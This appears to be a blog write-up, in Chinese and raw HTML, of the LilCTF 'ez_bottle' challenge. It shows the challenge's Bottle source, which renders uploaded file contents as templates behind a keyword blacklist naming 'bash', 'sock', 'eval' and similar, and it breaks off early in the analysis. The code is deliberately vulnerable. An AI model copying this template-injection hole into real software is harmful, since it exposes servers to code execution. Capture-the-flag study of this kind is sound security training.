@route(&#39;/view/<md5>/<filename>&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return "File not found." with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return "you are hacker!!!nonono!!!" try: return template(content) except Exception as e: return f"Error rendering template: {str(e)}" @error(404) def error404(error): return "bbbbbboooottle" @error(403) def error403(error): return "Forbidden: You don&#39;t have permission to access this resource." if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n'><meta property='og:url' content='https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/'><meta property='og:site_name' content='Oight'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-09-01T10:31:09+08:00'><meta property='article:modified_time' content='2025-09-01T10:31:09+08:00'><meta name=twitter:title content="LilCTF复现"><meta name=twitter:description content='LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals", "get", "open"] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr >> 16) & 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/<filename>&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) > MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template("文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}", files=", ".join(files), md5=md5_hash, first_file=files[0] if files else "nofile") @route(&#39;/view/<md5>/<filename>&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return "File not found." with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return "you are hacker!!!nonono!!!" try: return template(content) except Exception as e: return f"Error rendering template: {str(e)}" @error(404) def error404(error): return "bbbbbboooottle" @error(403) def error403(error): return "Forbidden: You don&#39;t have permission to access this resource." if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n'><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_37edead8cd3c258e.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐧</span></figure><div class=site-meta><h1 class=site-name><a href=/>Oight</a></h1><h2 class=site-description>Talk is cheap. Show me the code.</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/696224138 target=_blank title=bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/Oight target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#web>WEB</a><ol><li><a href=#ez_bottle>ez_bottle</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%A4%8D%E7%8E%B0/>复现</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/lilctf%E5%A4%8D%E7%8E%B0/>LilCTF复现</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2025-09-01</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h1 id=lilctf复现>LilCTF复现</h1><p>时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ</p><h2 id=web>WEB</h2><h3 id=ez_bottle>ez_bottle</h3><p>附件源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bottle</span> <span class=kn>import</span> <span class=n>route</span><span class=p>,</span> <span class=n>run</span><span class=p>,</span> <span class=n>template</span><span class=p>,</span> <span class=n>post</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>static_file</span><span class=p>,</span> <span class=n>error</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zipfile</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># hint: flag in /flag , have a try</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>UPLOAD_DIR</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s1>&#39;uploads&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>UPLOAD_DIR</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>STATIC_DIR</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s1>&#39;static&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>MAX_FILE_SIZE</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>BLACK_DICT</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;{&#34;</span><span class=p>,</span> <span class=s2>&#34;}&#34;</span><span class=p>,</span> <span class=s2>&#34;os&#34;</span><span class=p>,</span> <span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;exec&#34;</span><span class=p>,</span> <span class=s2>&#34;sock&#34;</span><span class=p>,</span> <span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> <span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;bul&#34;</span><span class=p>,</span> <span class=s2>&#34;class&#34;</span><span class=p>,</span> <span class=s2>&#34;?&#34;</span><span class=p>,</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;bash&#34;</span><span class=p>,</span> <span class=s2>&#34;_&#34;</span><span class=p>,</span> <span class=s2>&#34;globals&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>              <span class=s2>&#34;get&#34;</span><span class=p>,</span> <span class=s2>&#34;open&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>contains_blacklist</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>any</span><span class=p>(</span><span class=n>black</span> <span class=ow>in</span> <span class=n>content</span> <span class=k>for</span> <span class=n>black</span> <span class=ow>in</span> <span class=n>BLACK_DICT</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_symlink</span><span class=p>(</span><span class=n>zipinfo</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>zipinfo</span><span class=o>.</span><span class=n>external_attr</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mo>0o170000</span> <span class=o>==</span> <span class=mo>0o120000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_safe_path</span><span class=p>(</span><span class=n>base_dir</span><span class=p>,</span> <span class=n>target_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=n>target_path</span><span class=p>)</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=n>base_dir</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>static_file</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>root</span><span class=o>=</span><span class=n>STATIC_DIR</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s1>&#39;/static/&lt;filename&gt;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>server_static</span><span class=p>(</span><span class=n>filename</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>static_file</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>root</span><span class=o>=</span><span class=n>STATIC_DIR</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_page</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>static_file</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>root</span><span class=o>=</span><span class=n>STATIC_DIR</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@post</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>zip_file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>zip_file</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>zip_file</span><span class=o>.</span><span class=n>filename</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s1>&#39;.zip&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Invalid file. Please upload a ZIP file.&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>zip_file</span><span class=o>.</span><span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>())</span> <span class=o>&gt;</span> <span class=n>MAX_FILE_SIZE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>zip_file</span><span class=o>.</span><span class=n>file</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>current_time</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>unique_string</span> <span class=o>=</span> <span class=n>zip_file</span><span class=o>.</span><span class=n>filename</span> <span class=o>+</span> <span class=n>current_time</span>
+</span></span><span class=line><span class=cl>    <span class=n>md5_hash</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>unique_string</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>extract_dir</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>UPLOAD_DIR</span><span class=p>,</span> <span class=n>md5_hash</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>zip_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>,</span> <span class=s1>&#39;upload.zip&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>zip_file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>zip_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZipFile</span><span class=p>(</span><span class=n>zip_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>z</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>file_info</span> <span class=ow>in</span> <span class=n>z</span><span class=o>.</span><span class=n>infolist</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>is_symlink</span><span class=p>(</span><span class=n>file_info</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;Symbolic links are not allowed.&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>real_dest_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>,</span> <span class=n>file_info</span><span class=o>.</span><span class=n>filename</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=n>is_safe_path</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>,</span> <span class=n>real_dest_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;Path traversal detected.&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>z</span><span class=o>.</span><span class=n>extractall</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>BadZipFile</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Invalid ZIP file.&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>extract_dir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=s1>&#39;upload.zip&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;文件列表: {{files}}</span><span class=se>\n</span><span class=s2>访问: /view/{{md5}}/{{first_file}}&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=n>files</span><span class=o>=</span><span class=s2>&#34;, &#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>files</span><span class=p>),</span> <span class=n>md5</span><span class=o>=</span><span class=n>md5_hash</span><span class=p>,</span> <span class=n>first_file</span><span class=o>=</span><span class=n>files</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>files</span> <span class=k>else</span> <span class=s2>&#34;nofile&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s1>&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view_file</span><span class=p>(</span><span class=n>md5</span><span class=p>,</span> <span class=n>filename</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>UPLOAD_DIR</span><span class=p>,</span> <span class=n>md5</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>file_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;File not found.&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>contains_blacklist</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;you are hacker!!!nonono!!!&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error rendering template: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@error</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error404</span><span class=p>(</span><span class=n>error</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;bbbbbboooottle&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@error</span><span class=p>(</span><span class=mi>403</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error403</span><span class=p>(</span><span class=n>error</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;Forbidden: You don&#39;t have permission to access this resource.&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span></code></pre></div><p>题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）</p><p>可以看到这里有一个上传的路由<code>/upload</code>,可以用<code>POST</code>方法上传一个<code>zip</code>文件，经过一系列校验没问题后就会把<code>zip</code>文件里的内容渲染到<code>/view/&lt;md5>/&lt;filename></code>路由。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s1>&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class=p>)</span>
